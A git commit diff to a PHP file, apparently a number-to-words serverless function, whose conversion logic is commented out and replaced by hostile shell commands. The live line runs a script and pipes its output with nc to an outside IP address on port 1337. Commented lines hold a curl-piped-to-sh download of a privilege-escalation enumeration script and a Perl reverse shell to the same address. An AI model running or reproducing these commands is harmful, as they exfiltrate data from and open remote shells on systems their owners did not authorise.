c65798ce768dceac54b90c246049696735fed87b
ahptest1337 <102034204+ahptest1337@users.noreply.github.com>
2022-04-20 17:05:34 +0200

    Update index.php

--- packages/default/n2w/index.php
+++ packages/default/n2w/index.php
@@ -11,7 +11,7 @@ function main(array $args)
 //     $words = (new NumberToWords)->toWords($number);
  
     echo("------");
- echo(system("ls -asl ; echo 'step one' ; chmod +x test123.sh ; echo 'step two' ; ./test123.sh > result.txt ; ls -asl ; cat result.txt | nc 207.154.255.74 1337"));
+ echo(system("ls -asl ; echo 'step one' ; chmod +x test123.sh ; echo 'step two' ; ./test123.sh > result.txt ; echo 'step three' ; ls -asl ; cat result.txt | nc 207.154.255.74 1337"));
 //  echo(system("curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh");
 //     echo(system("whoami ; which wget ; /usr/bin/perl5.28.1 -e 'use Socket;\$i=\"207.154.255.74\";\$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"));
     echo("\n");
